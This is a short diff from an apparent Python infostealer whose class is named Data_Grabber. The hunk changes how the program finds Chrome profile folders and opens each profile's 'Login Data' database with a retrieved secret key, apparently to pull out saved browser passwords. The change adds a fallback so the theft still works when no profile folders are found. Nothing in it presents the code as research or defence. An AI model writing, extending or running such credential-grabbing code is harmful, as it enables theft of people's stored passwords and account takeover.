@@ -692,9 +692,16 @@ class Data_Grabber(functions):
                     secret_key = self.get_secret_key()
                     folders = [element for element in os.listdir(
                         CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
-                    for folder in folders:
-                        chrome_path_login_db = os.path.normpath(
-                            r"%s\%s\Login Data" % (CHROME_PATH, folder))
+                    length = len(folders)
+                    if length == 0:
+                        length = 1
+                    for numm in range(0, length):
+                        if len(folders) == 0:
+                            chrome_path_login_db = os.path.normpath(
+                                path + '\\Login Data')
+                        else:
+                            chrome_path_login_db = os.path.normpath(
+                                r"%s\%s\Login Data" % (CHROME_PATH, folders[numm]))
                         conn = self.get_db_connection(chrome_path_login_db)
                         if(secret_key and conn):
                             cursor = conn.cursor()
